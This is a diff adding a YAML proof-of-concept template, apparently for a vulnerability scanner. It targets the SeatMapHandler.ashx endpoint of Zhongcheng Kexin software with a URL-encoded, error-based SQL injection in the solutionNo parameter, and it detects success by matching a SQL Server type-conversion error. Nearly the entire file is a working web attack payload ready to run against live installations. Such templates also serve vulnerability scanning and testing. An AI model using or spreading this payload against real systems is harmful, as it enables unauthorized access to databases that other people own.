@@ -1,0 +1,24 @@
+name: poc-yaml-zhongchengkexin-SeatMapHandler-sql
+transport: http
+  
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /SystemManager/Comm/SeatMapHandler.ashx
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      
+      body: 'Method=GetZoneInfo&solutionNo=%27+AND+7821+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%287821%3D7821%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+Vjyh'
+    expression: response.status == 200 &&  response.body.bcontains(b'转换成数据类型 int 时失败。')
+
+
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139246023
+
